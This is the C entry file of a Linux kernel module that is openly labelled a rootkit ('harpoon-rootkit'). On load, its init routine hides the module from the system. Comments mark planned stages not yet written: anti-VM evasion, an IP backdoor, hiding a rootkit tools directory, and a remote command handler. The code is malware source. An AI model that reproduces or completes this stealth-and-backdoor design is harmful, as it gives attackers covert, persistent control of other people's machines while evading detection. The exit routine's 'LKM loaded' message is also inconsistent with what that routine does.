#include <linux/init.h>
#include <linux/module.h>
#include <linux/slab.h>

#include "global.h"
#include "module/module.h"

struct harpoon_struct *harpoon;

void harpoon_global_init(void){
    harpoon = kmalloc(sizeof(struct harpoon_struct), GFP_KERNEL);
    INIT_LIST_HEAD(&harpoon->module_list);
    INIT_LIST_HEAD(&harpoon->hook_list);
}

static int __init harpoon_init(void){
    struct harpoon_module *harpoon_mod;

    // Anti VM

    // Init harpoon;
    harpoon_global_init();

    // Hide harpoon module
    harpoon_mod = harpoon_new_mod(THIS_MODULE);
    harpoon_mod_hide(harpoon_mod);

    // Install ip backdoor

    // Hide RK tools director

    // Start cmd handler

    return 0;
}

static void __exit harpoon_exit(void){
    printk(KERN_INFO "LKM loaded");
    return;
}

module_init(harpoon_init);
module_exit(harpoon_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xTen + shquish");
MODULE_DESCRIPTION("harpoon-rootkit");